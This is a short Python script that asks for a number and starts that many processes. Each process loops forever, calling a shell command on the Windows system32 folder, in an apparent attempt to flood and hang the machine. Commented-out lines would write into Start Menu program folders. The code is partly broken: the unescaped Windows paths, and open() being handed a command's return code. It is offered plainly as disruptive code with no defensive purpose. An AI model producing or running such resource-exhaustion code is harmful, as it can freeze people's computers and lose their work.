import os
import multiprocessing

number = int(input("enter the number of prompt: "))

# for i in range(number):
#     # open("C:\\Users\\olive\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System Tools","a")
#     open("C:\ProgramData\Microsoft\Windows\Start Menu\Programs\TDM-GCC-64","w")
#
def worker():
    while True:
        open(os.system("C:\WINDOWS\system32"))

if  __name__ =="__main__":
    jobs = []
    for i in range(number):
        p = multiprocessing.Process(target=worker)
        jobs.append(p)
        p.start()